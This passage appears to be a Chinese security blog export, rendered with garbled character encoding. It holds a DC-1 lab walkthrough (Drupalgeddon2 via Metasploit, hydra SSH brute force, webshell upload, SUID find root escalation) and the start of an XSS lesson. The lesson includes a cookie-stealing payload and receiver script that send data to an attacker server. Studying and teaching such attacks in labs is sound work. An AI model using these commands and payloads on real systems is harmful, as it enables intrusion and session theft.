æ˜¯ä¸€ä¸ªä¸“é—¨æ„å»ºçš„æ˜“å—æ”»å‡»çš„å®éªŒå®¤ï¼Œæ—¨åœ¨è·å¾—æ¸—é€æµ‹è¯•é¢†åŸŸçš„ç»éªŒã€‚å…±æœ‰äº”ä¸ªflagï¼Œä½†æœ€ç»ˆç›®æ ‡æ˜¯æ‹¿åˆ°rootç›®å½•ä¸­çš„flagã€‚\n\n**æ¶‰åŠæ¼æ´ï¼š**[CVE-2018-7600](http://vulhub.org.cn/vuln/VH-CVE-2018-7600)      [CVE-2018-7600](http://vulhub.org.cn/vuln/VH-CVE-2018-7600) \n\n**å‚è€ƒï¼š**[CVE-2018-7600 Drupalæ ¸å¿ƒè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ](https://www.anquanke.com/post/id/104697)     [Uncovering Drupalgeddon 2](https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/)\n\n**æ”»å‡»æœºï¼š**Kali/192.168.0.104\n\n### ä¸€ã€ä¿¡æ¯æ”¶é›†\n\nè¿è¡Œéƒ¨ç½²å¥½çš„è™šæ‹Ÿæœºï¼Œæç¤ºéœ€è¦è´¦å·å¯†ç ï¼Œè¯¥é¶æœºä¸æä¾›å¯†ç éœ€è¦è‡ªå·±å»æ¸—é€ææƒ\n\n![](https://i.loli.net/2020/05/16/NHTOKwQBoXLgEU8.png)\n\n**å› ä¸çŸ¥é“DC-1é¶æœºçš„IPï¼Œæ‰€æœ‰æˆ‘ä»¬éœ€è¦å°†é¶æœºå’Œæ”»å‡»æœºkaliæ”¾åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘é‡Œé¢ï¼Œå°†Kaliçš„ç½‘ç»œé€‚é…å™¨ä½¿ç”¨`æ¡¥æ¥æ¨¡å¼`**\n\n#### 1.æ¢æµ‹ç›®æ ‡\n\n**æ–¹æ³•ä¸€ï¼šä½¿ç”¨arp-scanå·¥å…·**\n\næ¢æµ‹åŒä¸€åŒºåŸŸä¸­å­˜æ´»ä¸»æœº\n\n```bash\n$ sudo arp-scan -l\n\n-l ä½¿ç”¨ç½‘ç»œæ¥å£\n```\n\n![](https://i.loli.net/2020/05/16/TroRKx1gVv3hZF2.png)\n\n[kaliä¹‹arp-scan](https://blog.csdn.net/weixin_43221560/article/details/90550294)\n\n**æ–¹æ³•äºŒï¼šä½¿ç”¨netdiscoverå·¥å…·**\n\næ¢æµ‹å­˜æ´»ä¸»æœº\n\n```bash\n$ sudo netdiscover -i eth0\n\n-i device ç”¨äºå—…æ¢å’Œæ³¨å…¥æ•°æ®åŒ…çš„ç½‘ç»œæ¥å£\n```\n\n![](https://i.loli.net/2020/05/16/CKZuIEU3P9T4gqn.png)\n\n[netdiscoverç”¨æ³•](https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html)\n\n**æ–¹æ³•ä¸‰ï¼šä½¿ç”¨nmapå·¥å…·**\n\n```bash\n$ sudo ifconfig #æŸ¥çœ‹kaliçš„ipã€192.168.0.103ã€‘\n$ nmap 192.168.0.0/24\n```\n\n#### 2.æŸ¥çœ‹ç›®æ ‡å¼€æ”¾ç«¯å£\n\n```bash\n$ nmap -sV -p- 192.168.0.119\n\n-sV ç”¨æ¥æ‰«æç›®æ ‡ä¸»æœºå’Œç«¯å£ä¸Šè¿è¡Œçš„è½¯ä»¶çš„ç‰ˆæœ¬\n-p- æ‰«æ0-65535å…¨éƒ¨ç«¯å£\n```\n\n![](https://i.loli.net/2020/05/16/b4VFOxylKc9h2wS.png)\n\nç›®æ ‡é¶æœºå¼€æ”¾äº†80ç«¯å£,åœ¨æµè§ˆå™¨æ‰“å¼€è¯¥ç«™ç‚¹\n\n#### 3.æŸ¥çœ‹ç½‘é¡µç›¸å…³ä¿¡æ¯\n\nä½¿ç”¨æµè§ˆå™¨æ’ä»¶`Wappalyzer`ï¼Œè¿™ä¸ªæ’ä»¶å¯ä»¥æ£€æµ‹ç½‘ç«™çš„CMSï¼Œæ¡†æ¶ï¼ŒæœåŠ¡å™¨ç­‰ä¿¡æ¯ï¼Œ\n\nå¯ä»¥çœ‹åˆ°è¯¥ç½‘ç«™ä½¿ç”¨CMSä¸º`Drupal`ï¼Œå…¶å®åœ¨ç½‘é¡µç•Œé¢å’Œåº•éƒ¨éƒ½èƒ½å‘ç°æ˜¯Drupal\n\n![](https://i.loli.net/2020/05/16/FwIa8NtxdBA2JPi.png)\n\n\n\n### äºŒã€æ¼æ´æŸ¥æ‰¾ä¸åˆ©ç”¨\n\n#### 1.æ¼æ´æŸ¥æ‰¾\n\nä½¿ç”¨Metasploitæœç´¢Drupal\n\n```bash\n$ sudo msfdb init && msfconsole\n$ search Drupal\n```\n\n![](https://i.loli.net/2020/05/16/KLMDfthcud8Ik6g.png)\n\n#### 2.æ¼æ´åˆ©ç”¨\n\nä¼˜å…ˆé€‰æ‹©ä¸Šé¢æŸ¥åˆ°æ¨¡å—çš„Rankä¸ºexcellentå¹¶ä¸”æ—¶é—´è¾ƒæ–°çš„æ¨¡å—ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç¬¬4ä¸ª\n\n```bash\n$ use exploit/unix/webapp/drupal_drupalgeddon2 \n$ show options\n$ set RHOSTS 192.168.0.119\n$ exploit æˆ–è€… run\n#å½“å‡ºç°â€œMeterpreter session 1 openedâ€è¯´æ˜åˆ©ç”¨æˆåŠŸ\n```\n\n![](https://i.loli.net/2020/05/16/xjtqeUwfM5FpykP.png)\n\n![](https://i.loli.net/2020/05/16/HI5EX9xpeVTyBcr.png)\n\n[MSFä¹‹å‘½ä»¤ç¬”è®°ç¯‡](http://sh1yan.top/2019/07/28/MSF-Command-Notes/)\n\n### ä¸‰ã€Getshell\n\n#### 1.è·å–æ™®é€šshell\n\n```bash\nmeterpreter >shell\nls\n```\n\n![](https://i.loli.net/2020/05/16/8gem543oQr6LZTc.png)\n\nå‘ç°æœ‰ä¸ª`flag1.txt`ï¼Œæ‰“å¼€çœ‹ä¸€å“ˆ\n\n```bash\n$ cat flag1.txt\nEvery good CMS needs a config file - and so do you.\n```\n\nç¿»è¯‘ï¼šæ¯ä¸€ä¸ªå¥½çš„CMSéƒ½éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä½ ä¹Ÿä¸€æ ·ã€‚\n\nç™¾åº¦æŸ¥åˆ°Drupalçš„é»˜è®¤é…ç½®æ–‡ä»¶ä¸º `/var/www/sites/default/settings.php`\n\n[drupal7çš„ç›®å½•ç»“æ„åŠæœ¯è¯­](https://www.iteye.com/blog/justcoding-1407697)\n\n```bash\ncat /var/www/sites/default/settings.php\n```\n\n![](https://i.loli.net/2020/05/16/rRTl5Ng4yoJDX1L.png)\n\né…ç½®æ–‡ä»¶ä¸­çœ‹åˆ°äº†`flag2`\n\nç¿»è¯‘:è›®åŠ›å’Œå­—å…¸æ”»å‡»ä¸è¡Œï¼Œå”¯ä¸€æ–¹æ³•æ˜¯è·å¾—è®¿é—®æƒé™(ä½ å°†éœ€è¦è®¿é—®çš„)ã€‚ä½ èƒ½ç”¨è¿™äº›å‡­è¯åšä»€ä¹ˆ?\n\nåŒæ—¶ï¼Œè¿˜æœ‰è·å¾—äº†æ•°æ®åº“è´¦å·å’Œå¯†ç \n\n```\n'username' => 'dbuser',\n'password' => 'R0ck3t',\n```\n#### 2.è·å–äº¤äº’å¼shell\n\nä½¿ç”¨pythonåå¼¹ä¸€ä¸ªäº¤äº’å¼shellï¼Œç„¶åæˆ‘ä»¬ç™»é™†æ•°æ®åº“\n\n```bash\n$ python -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n$ mysql -udbuser -p\nEnter password:R0ck3t\n```\n\n![](https://i.loli.net/2020/05/17/ugkBJPU3d7Hzlnv.png)\n\næŸ¥çœ‹æ•°æ®åº“,åœ¨drupaldbåº“usersè¡¨ä¸­å‘ç°adminç”¨æˆ·\n\n```mysql\nmysql> show databases; #[drupaldb]\nmysql> use drupaldb;\nmysql> show tables; #[users]\nmysql> select * from users;\n```\n\n![](https://i.loli.net/2020/05/17/SGaPZVomDkRLpA2.png)\n\n![image-20200517095356679](https://i.loli.net/2020/05/17/PFKyEd4zqncsVmC.png)\n\nå¯ä»¥çœ‹åˆ°adminç”¨æˆ·çš„å¯†ç è¢«åŠ å¯†äº†çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•ä¿®æ”¹å¯†ç æˆ–æ–°å¢ä¸€ä¸ªadminæƒé™çš„ç”¨æˆ·\n\n**æ–¹æ³•ä¸€ï¼š**ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç \n\nä½¿ç”¨Drupalå¯¹æ•°æ®åº“çš„åŠ å¯†æ–¹æ³•ï¼Œç”Ÿæˆä¸€ä¸ªæ–°å¯†ç ï¼Œç„¶åæŠŠæ–°çš„å¯†ç æ›´æ–°åˆ°adminç”¨æˆ·\n\nåŠ å¯†è„šæœ¬ä½ç½®åœ¨`/var/www/scripts/password-hash.sh`ä¸‹\n\nå‚è€ƒï¼š[å¿˜è®°Drupalçš„ç®¡ç†å‘˜å¯†ç çš„è§£å†³åŠæ³•](http://drupalchina.cn/node/2128)\n\n```bash\n$ php scripts/password-hash.sh jwt  #ç”Ÿæˆæ–°å¯†ç jwt\n# hash:$S$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R.cDGjgChoX\n\nmysql> update drupaldb.users set pass=\"$S$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R.cDGjgChoX\" where name=\"admin\";\n```\n\n![image-20200517101339236](https://i.loli.net/2020/05/17/Ihmut4gaZNVyBX5.png)\n\n![image-20200517101410076](https://i.loli.net/2020/05/17/q6T9HNAlZUmwFsh.png)\n\n**æ–¹æ³•äºŒï¼š**æ–°å¢ä¸€ä¸ªadminæƒé™çš„ç”¨æˆ·\n\nåœ¨exploitdbä¸­æœ‰ä¸€ä¸ªé’ˆå¯¹Drupal 7ç‰ˆæœ¬çš„æ”»å‡»è„šæœ¬ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªadminæƒé™çš„ç”¨æˆ·è´¦å·\n\n\n\næŸ¥çœ‹Drupalç‰ˆæœ¬,ç¡®å®šDrupalç‰ˆæœ¬ä¸º7.24\n\n```bash\n$ cat /var/www/includes/bootstrap.inc | grep VERSION\n```\n\n![image-20200517130545021](https://i.loli.net/2020/05/17/2TnfzyQHIAXkidc.png)\n\n```bash\nmsf > searchsploit drupal\n```\n\n![](https://i.loli.net/2020/05/17/fvSrwXp6Al5BmHz.png)\n\næ”»å‡»è„šæœ¬é€‚ç”¨äº7.31ä»¥ä¸‹ï¼Œæ‰€ä»¥é€‚åˆ7.24ç‰ˆæœ¬,å¯ä»¥åˆ©ç”¨æ¼æ´å¢åŠ adminæƒé™ç”¨æˆ·\n\nå¢åŠ æœ‰adminæƒé™çš„ç”¨æˆ·ï¼šadmin1/admin1\n\n```bash\npython /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.0.100 -u admin1 -p admin1\n```\n\nè¾“å…¥ç”¨æˆ·å/å¯†ç ã€admin/jwtæˆ–è€…admin1/admin1ã€‘ï¼Œå°è¯•ç™»é™† \n\n![](https://i.loli.net/2020/05/17/2ugc4GCWK6pZHfQ.png)\n\næˆåŠŸç™»é™†\n\n![](https://i.loli.net/2020/05/17/2yNEYavswqhoxJg.png)\n\n\n\n\n\nåœ¨åå°å·¦ä¸Šè§’çš„`Find content`ä¸­å‘ç°flag3\n\n![image-20200517102352344](https://i.loli.net/2020/05/17/Pl3E8IFh4SDb6gj.png)\n\n\n\nflag3çš„ä¿¡æ¯ä¸­æåˆ°äº†passwdå’Œshadow,å¾ˆæ˜æ˜¾å°±æ˜¯`/etc/passwdå’Œ/etc/shadow`ï¼Œè¿˜æåˆ°äº†`findã€permsã€-exec`ï¼Œè¿™å‡ ä¸ªæ˜¯ææƒç”¨çš„ã€‚\n\næˆ‘ä»¬æ¥æŸ¥çœ‹å“ˆ/`etc/passwdå’Œ/etc/shadow` çš„å†…å®¹\n\n> /etc/passwd æ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ã€‚å®ƒå­˜å‚¨ç”¨æˆ·å¸æˆ·ä¿¡æ¯ã€‚å®ƒåŒ…å«ç³»ç»Ÿå¸æˆ·çš„åˆ—è¡¨ï¼Œä¸ºæ¯ä¸ªå¸æˆ·æä¾›ä¸€äº›æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ· IDã€ç»„ IDã€ä¸»ç›®å½•ã€shell ç­‰\n>\n>  [/etc/passwdè¯¦æƒ…](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)\n>\n> etc/shadowæ˜¯/etc/passwdçš„å½±å­æ–‡ä»¶ï¼Œå­˜æœ‰å¯†ç ä¿¡æ¯\n\n```bash\n$ cat /etc/passwd\næˆ–è€…\n$ tail -3 /etc/passwd  #ä¸ºäº†æ–¹ä¾¿æˆªå›¾ï¼Œåªæ˜¾ç¤ºæ–‡ä»¶çš„æœ€åä¸‰è¡Œ\n\n$ cat /etc/shadow #æƒé™ä¸å¤ŸæŸ¥çœ‹å¤±è´¥\n```\n\n![](https://i.loli.net/2020/05/17/HonD8RieWJgrS1p.png)\n\nå‘ç°æœ‰ä¸ªå«`flag4`çš„è´¦å·ï¼Œä½†æ˜¯æŸ¥çœ‹ä½¿ç”¨`/etc/shadow`å¤±è´¥ï¼Œä½†æ˜¯å‰é¢nmapæ‰«æçš„æ—¶å€™å‘ç°äº† ssh æœåŠ¡ï¼Œç°åœ¨åˆå‘ç°äº† flag4 ç”¨æˆ·ï¼Œæ‰€ä»¥å°è¯•ä½¿ç”¨`hydra `è¿›è¡Œå¯†ç çš„æš´åŠ›çŒœè§£\n\n```bash\nsudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz 192.168.0.100 ssh\næˆ–è€…\nsudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.0.100\n\n#ipå˜æˆ192.168.0.100ï¼Œæ˜¯åº”ä¸ºæˆ‘é‡å¯äº†ï¼Œé¶æœºipå˜äº†\n-l  æŒ‡å®šç ´è§£çš„ç”¨æˆ·\n-P  æŒ‡å®šå¯†ç å­—å…¸\nssh://ip æŒ‡å®šä½¿ç”¨åè®®å’Œipåœ°å€\n```\n\n![](https://i.loli.net/2020/05/16/Kb8FI9HYGaqLfkM.png)\n\n[æš´åŠ›å¯†ç åœ¨çº¿ç ´è§£å·¥å…·Hydraè¯¦è§£](http://www.ha97.com/5186.html)\n\nä½¿ç”¨å¾—åˆ°ç”¨æˆ·åå¯†ç ã€ flag4/orangeã€‘ï¼Œç™»å½•é¶æœº\n\n![](https://i.loli.net/2020/05/16/6clWopZR2OfKEQb.png)\n\nä¹Ÿå¯ä»¥ç”¨kaliç›´æ¥è¿œç¨‹è¿æ¥\n\n```bash\nssh flag4@192.168.0.100\n```\n\n![](https://i.loli.net/2020/05/16/V3eb5srdkzi2fZF.png)\n\n```bash\n$ ls\n$ cat flag4.txt\n```\n\n![](https://i.loli.net/2020/05/17/qmtczhZHVaik3xE.png)\n\nflag4æç¤ºflagåœ¨rootç›®å½•ä¸‹ï¼Œåœ¨`/root`ä¸‹å‘ç°`thefinalflag.txt`ï¼Œä½†æ˜¯æ²¡æœ‰è¯»å–çš„æƒé™\n\n![](https://i.loli.net/2020/05/17/wLYZhdx39znRMGv.png)\n\n#### 3.ä¸Šä¼ å†°èé©¬è·å–shell\n\nå½“ç„¶ä½ è¿˜å¯ä»¥åˆ©ç”¨meterperterçš„shellç›´æ¥ä¸Šä¼ å†°èçš„shellã€‚\n\n```bash\nmeterperter> upload /home/jwt/Desktop/shell.php /var/www/shell.php\n```\n\nç„¶åå†°èè¿æ¥å°±å¯ä»¥äº†\n\n### å››ã€æå‡æƒé™\n\næ ¹æ®flag3å’Œflag4éƒ½æåˆ°äº†find,æ‰€ä»¥ä¸‹é¢æˆ‘ä»¬åˆ©ç”¨findæ–‡ä»¶ææƒ\n\nå‚è€ƒï¼š[Linuxä¸‹ç”¨SUIDææƒ](https://blog.csdn.net/qq_36119192/article/details/84872644)ã€[linuxææƒ-SUIDææƒ](https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase)ã€[findå‘½ä»¤ä¹‹exec](https://www.cnblogs.com/huchong/p/9961625.html)\n\n> SUIDå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…çš„èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨SUIDææƒçš„æ€è·¯å°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„SUIDçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿è¡Œè¯¥æ–‡ä»¶çš„æ—¶å€™å°±å¾—è·å¾—rootç”¨æˆ·çš„èº«ä»½äº†ã€‚\n\n```bash\n#æŸ¥æ‰¾å…·æœ‰rootæƒé™çš„SUIDçš„æ–‡ä»¶\n$ find / -perm -u=s -type f 2>/dev/null\n```\n\n![](https://i.loli.net/2020/05/17/oBHRnfd6O9ZrS38.png)\n\nå¯ä»¥çœ‹åˆ°findå‘½ä»¤å…·æœ‰SUIDæƒé™ï¼Œå¦‚æœfindä»¥SUIDæƒé™è¿è¡Œï¼Œæ‰€æœ‰é€šè¿‡findæ‰§è¡Œçš„å‘½ä»¤éƒ½ä¼šä»¥rootæƒé™è¿è¡Œã€‚\n\n```bash\n$ touch jwt\n#æŸ¥æ‰¾æ ¹ç›®å½•ä¸‹åä¸ºjwtçš„æ–‡ä»¶å¹¶æ‰§è¡Œshell\n$ find / -name jwt -exec \"/bin/sh\" \\;\n\n#-exec å‚æ•°åé¢è·Ÿçš„æ˜¯commandå‘½ä»¤ï¼Œå®ƒçš„ç»ˆæ­¢æ˜¯ä»¥;ä¸ºç»“æŸæ ‡å¿—çš„ï¼Œæ‰€ä»¥è¿™å¥å‘½ä»¤åé¢çš„åˆ†å·æ˜¯ä¸å¯ç¼ºå°‘çš„ï¼Œè€ƒè™‘åˆ°å„ä¸ªç³»ç»Ÿä¸­åˆ†å·ä¼šæœ‰ä¸åŒçš„æ„ä¹‰ï¼Œæ‰€ä»¥åœ¨åˆ†å·å‰é¢åŠ åæ–œæ ã€‚\n```\n\n![image-20200517113343425](https://i.loli.net/2020/05/17/EGqIUHOpNa6nmVg.png)\n\nå¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸææƒæ‹¿åˆ°root shellï¼Œæ¥ä¸‹æ¥å°±æ¥æŸ¥çœ‹æœ€ç»ˆçš„flagå§\n\n```bash\ncd /root\nls\ncat thefinalflag.txt\n```\n\n![image-20200517113640702](https://i.loli.net/2020/05/17/yrWDTYFC6hRvUsu.png)\n\nåˆ°è¿™é‡Œæˆ‘ä»¬å°±æˆåŠŸè·å–åˆ°äº†5ä¸ªflag,å¹¶æˆåŠŸèµ°å®Œäº†æ•´ä¸ªæ¸—é€æµç¨‹\n\n### äº”ã€æ€»ç»“\n\n1.æ‰«æå±€åŸŸç½‘ä¸»æœº\n\n`sudo arp-scan -l` å‚è€ƒï¼š[kaliä¹‹arp-scan](https://blog.csdn.net/weixin_43221560/article/details/90550294)\n\n`sudo netdiscover -i eth0` å‚è€ƒï¼š[netdiscoverç”¨æ³•](https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html)\n\n`nmap 192.168.0.0/24`\n\n2.MSFä½¿ç”¨\n\nå‚è€ƒï¼š[MSFä¹‹å‘½ä»¤ç¬”è®°ç¯‡](http://sh1yan.top/2019/07/28/MSF-Command-Notes/)\n\n3.hydraçˆ†ç ´\n\n`sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.0.100`\n\nå‚è€ƒï¼š[æš´åŠ›å¯†ç åœ¨çº¿ç ´è§£å·¥å…·Hydraè¯¦è§£](http://www.ha97.com/5186.html)\n\n4.suidææƒ\n\nå‚è€ƒï¼š[Linuxä¸‹ç”¨SUIDææƒ](https://blog.csdn.net/qq_36119192/article/details/84872644)ã€[linuxææƒ-SUIDææƒ](https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase)ã€[findå‘½ä»¤ä¹‹exec](https://www.cnblogs.com/huchong/p/9961625.html)\n\n\n\n## èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>","tags":["é¶åœº","æ¸—é€æµ‹è¯•"],"categories":["Web"]},{"title":"æµ…è°ˆXSS&Beef","url":"/posts/43901.html","content":"\n<center><font color=pink size=8 weigh:500>æµ…è°ˆXSS&BeEF</font></center>\n\n## å‰è¨€\n\næœ¬æ–‡ç« äº§ç”Ÿçš„ç¼˜ç”±æ˜¯å› ä¸ºä¸“ä¸šè€å¸ˆï¼Œè®©æˆ‘ç»™æœ¬ä¸“ä¸šçš„åŒå­¦è®²ä¸€å“ˆSQLæ³¨å…¥å’ŒXSSå…¥é—¨,ä¸ºäº†å¤‡è¯¾ï¼Œäºæ˜¯äº§ç”Ÿäº†è¿™ç¯‡æ–‡ç« ã€‚\n\n## ä¸€ã€è¯¾ç¨‹ç›®æ ‡\n\n> å¬å®Œè¿™èŠ‚è¯¾ä½ èƒ½å­¦åˆ°äº›ä»€ä¹ˆğŸ‘‡\n\n\n- [x] çŸ¥é“ä»€ä¹ˆæ˜¯Xss\n- [x] å®ç°æœ€åŸºç¡€çš„Xss\n- [x] å­¦ä¼šä½¿ç”¨Beef Xsså·¥å…·\n- [x] äº†è§£ä¸€äº›Webå®‰å…¨åŸºæœ¬çŸ¥è¯†\n\n## äºŒã€åˆè¯†XSS\n\n### 1 ä»€ä¹ˆæ˜¯XSSæ”»å‡»\n\nâ€¢\tXSSï¼ˆCross Site Scriptï¼‰ï¼Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ŒOWASP Top10ä¹‹ä¸€  \nâ€¢\tå‘ç½‘é¡µå†…åµŒå…¥æ¶æ„Java scriptä»£ç \n\n### 2 XSSåˆ†ç±»\n\nâ€¢\tåå°„å‹ -- å‰ç«¯->åç«¯->å‰ç«¯\nâ€¢\tå­˜å‚¨å‹ -- å‰ç«¯->åç«¯->æ•°æ®åº“->å‰ç«¯\nâ€¢\tDOMå‹ -- å‰ç«¯\n\n### 3 XSSå¸¸ç”¨æ”»å‡»æ‰‹æ®µ\n\n- **çªƒå–ç½‘é¡µæµè§ˆä¸­çš„cookieå€¼**\n\nå½“èƒ½å¤Ÿçªƒå–åˆ°ç”¨æˆ· Cookie ä»è€Œè·å–åˆ°ç”¨æˆ·èº«ä»½æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è·å–åˆ°ç”¨æˆ·å¯¹ç½‘ç«™çš„æ“ä½œæƒé™ï¼Œä»è€ŒæŸ¥çœ‹ç”¨æˆ·éšç§ä¿¡æ¯ã€‚\n\n- **é’“é±¼æ¬ºéª—**ï¼š\n\næœ€å…¸å‹çš„å°±æ˜¯åˆ©ç”¨ç›®æ ‡ç½‘ç«™çš„åå°„å‹è·¨ç«™è„šæœ¬æ¼æ´å°†ç›®æ ‡ç½‘ç«™é‡å®šå‘åˆ°é’“é±¼ç½‘ç«™ï¼Œæˆ–è€…æ³¨å…¥é’“é±¼ JavaScript ä»¥ç›‘æ§ç›®æ ‡ç½‘ç«™çš„è¡¨å•è¾“å…¥ã€‚\n\n- **ç½‘ç«™æŒ‚é©¬**\n\nè·¨ç«™æ—¶åˆ©ç”¨ IFrame åµŒå…¥éšè—çš„æ¶æ„ç½‘ç«™æˆ–è€…å°†è¢«æ”»å‡»è€…å®šå‘åˆ°æ¶æ„ç½‘ç«™ä¸Šï¼Œæˆ–è€…å¼¹å‡ºæ¶æ„ç½‘ç«™çª—å£ç­‰æ–¹å¼éƒ½å¯ä»¥è¿›è¡ŒæŒ‚é©¬æ”»å‡»ã€‚\n\n- **åƒåœ¾ä¿¡æ¯å‘é€**\n\næ¯”å¦‚åœ¨ SNS ç¤¾åŒºä¸­ï¼Œåˆ©ç”¨ XSS æ¼æ´å€Ÿç”¨è¢«æ”»å‡»è€…çš„èº«ä»½å‘é€å¤§é‡çš„åƒåœ¾ä¿¡æ¯ç»™ç‰¹å®šçš„ç›®æ ‡ç¾¤ã€‚\n\n- **åŠ«æŒç”¨æˆ· Web è¡Œä¸º**\n\nä¸€äº›é«˜çº§çš„ XSS æ”»å‡»ç”šè‡³å¯ä»¥åŠ«æŒç”¨æˆ·çš„ Web è¡Œä¸ºï¼Œç›‘è§†ç”¨æˆ·çš„æµè§ˆå†å²ï¼Œå‘é€ä¸æ¥æ”¶çš„æ•°æ®ç­‰ç­‰ã€‚\n\n- **XSS è •è™«**\n\nXSS è •è™«å¯ä»¥ç”¨æ¥æ‰“å¹¿å‘Šã€åˆ·æµé‡ã€æŒ‚é©¬ã€æ¶ä½œå‰§ã€ç ´åç½‘ä¸Šæ•°æ®ã€å®æ–½ DDoS æ”»å‡»ç­‰ã€‚\n\n## ä¸‰ã€åˆè¯•XSS\n\n### 1 XSSåˆä½“éªŒ\n\nå¾€DVWAé¶åœºæ’å…¥ä¸‹æ–¹JSï¼Œä¼šå¼¹æ¡†\n\n```javascript\n<script>alert(\"Hi!æˆ‘æ˜¯ç®€ç®€\")</script>;\n```\n\nå½“ç„¶è¿˜å¯ä»¥åµŒå…¥HTMLå’ŒCSS,ä½†æ˜¯ç”¨å¤„ä¸å¤§\n\n\n```javascript\n<img src=x onerror='alert(\"hey!\")'>;\n\n<h1>Hi!æˆ‘æ˜¯ç®€ç®€</h1><style>h1{color:pink; text-align:center}<style>\n\n<img src='https://jwt1399.top/medias/avatar.png' width=200px;height:200px;/>\n```\n\nå…¶ä»–æ“ä½œ\n\n```javascript\n<svg/onload=alert(1)>   //onloadæ˜¯æŒ‡åœ¨åŠ è½½è¯¥é¡µé¢æ—¶å°±æ‰§è¡Œï¼Œç„¶åè§‚å¯Ÿæ˜¯å¦æœ‰å¼¹çª—ã€‚\n\n#è·å–cookie\n<script>alert(document.cookie)</script>;\n\n#é¡µé¢è·³è½¬\n<script>window.location.href=\"https://jwt1399.top\";</script>\n```\n\n### 2 åˆ©ç”¨Xssè·å–cookieç»•è¿‡ç™»å½•éªŒè¯\n\n>webæœåŠ¡æ‰€ä½¿ç”¨çš„HTTPæœåŠ¡æ˜¯æ— çŠ¶æ€çš„ã€‚è¿™å°±æ„å‘³ç€ï¼ŒæœåŠ¡å™¨æ— æ³•åˆ†è¾¨æ”¶åˆ°çš„è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ï¼Œ\n>éœ€è¦é€šè¿‡cookieæ¥å¯¹ç”¨æˆ·çš„èº«ä»½è¿›è¡Œæ ‡è¯†äº†ï¼Œç”¨æˆ·æ¯æ¬¡å¯¹æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œéƒ½å¸¦ä¸Šè‡ªå·±ç‹¬æœ‰çš„cookieï¼ŒæœåŠ¡å™¨é€šè¿‡è¯»å–cookieä¿¡æ¯ï¼Œè¯†åˆ«ç”¨æˆ·ã€‚\n\n1ã€é¦–å…ˆæ‰“å¼€1å·æµè§ˆå™¨ï¼Œè¾“å…¥è´¦å·å’Œå¯†ç ç™»å½•DVWA,ç„¶åè·å–cookie\n\næ–¹æ³•ä¸€ï¼šXSSå¹³å°\n\n```javascript\n<script src=http://xss.fbisb.com/ij7V></script>\n```\n\næ–¹æ³•äºŒï¼šè‡ªå·±æ­å»ºæ¥æ”¶å¹³å°\n\n**cookie.php**ï¼ˆä¸Šä¼ åˆ°è‡ªå·±æœåŠ¡å™¨ï¼‰\n\n```php\n<?php\n$cookie = $_GET['cookie'];\nfile_put_contents('cookie.txt',$cookie);\n?>\n```\n\n**payload:**\n\n```javascript\n<script>document.location=\"http://æœåŠ¡å™¨ip/cookie.php?cookie=\"+document.cookie</script>\n```\n\nè·å–åˆ°çš„ cookie å­˜å‚¨åœ¨ cookie.txt ä¸­\t\n\næ–¹æ³•ä¸‰ï¼šBeEFè·å–\n\n2ã€ç„¶åæ‰“å¼€2å·è·¯æµè§ˆå™¨ï¼Œè¿›å…¥åˆ°DVWAçš„loginé¡µé¢ï¼Œåœ¨è¯¥é¡µé¢åˆ©ç”¨cookieæ’ä»¶å°†cookieæ›¿æ¢ä¸ºæˆ‘ä»¬è·å–åˆ°çš„1å·æµè§ˆå™¨çš„cookieï¼Œç„¶ååœ¨URLæ ä¸­åˆ 